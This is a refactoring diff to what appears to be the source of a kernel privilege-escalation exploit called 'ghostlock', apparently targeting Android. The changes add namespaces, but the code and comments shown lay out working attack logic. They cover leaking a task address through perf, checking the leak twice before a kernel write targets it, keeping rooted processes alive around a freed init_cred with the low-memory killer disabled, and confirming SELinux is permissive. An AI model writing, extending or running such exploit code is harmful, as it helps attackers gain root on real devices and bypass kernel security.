@@ -8,6 +8,8 @@
 
 #include "exploit_ops.hpp"
 
+namespace ghostlock::victim {
+
 /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
 /* Decoupling plan: retain a rooted child that references the credential.
@@ -35,10 +37,10 @@ static void child_main(ghostlock::VictimContext *p) {
     prctl(PR_SET_NAME, "ghostleaf_0123456789");
     /* a real leak reproduces, a fluke vote winner does not. w2 writes to
      * this address, so two runs must agree or the leak is discarded. */
-    uintptr_t my_task = perf_find_task();
+    uintptr_t my_task = ghostlock::ops::perf_find_task();
     int leak_agreed = 0;
     for (int i = 0; i < 2 && my_task; i++) {
-        uintptr_t again = perf_find_task();
+        uintptr_t again = ghostlock::ops::perf_find_task();
         if (again == my_task) {
             leak_agreed = 1;
             break;
@@ -202,7 +204,7 @@ pid_t spawn_victim(ghostlock::VictimContext *p, uintptr_t *task_out) {
  * output: boolean/status. Future: stage_verify_selinux(const StageContext *). */
 int verify_selinux_stage(void *context) {
     (void) context;
-    if (!check_selinux_off()) return 0;
+    if (!ghostlock::ops::check_selinux_off()) return 0;
     pr_success("SELinux permissive\n");
     return 1;
 }
@@ -282,3 +284,5 @@ int verify_leaf_dir_stage(void *context) {
     pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned) len, c0);
     return 0;
 }
+
+}  // namespace ghostlock::victim
